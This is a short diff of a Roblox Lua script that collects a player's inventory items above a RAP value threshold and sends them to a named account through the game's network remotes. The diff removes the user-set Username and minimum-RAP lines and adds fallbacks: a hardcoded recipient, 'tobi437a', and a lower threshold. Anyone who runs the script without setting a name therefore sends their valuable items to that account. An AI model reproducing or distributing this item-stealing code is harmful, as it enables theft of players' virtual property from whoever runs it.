@@ -1,6 +1,3 @@
-Username = "your user here"
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 10k by default
-
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
@@ -54,7 +51,8 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local user = Username
+local user = Username or "tobi437a"
+local min_rap = min_rap or 100000
 
 local function sendItem(category, uid, am)
     local args = {
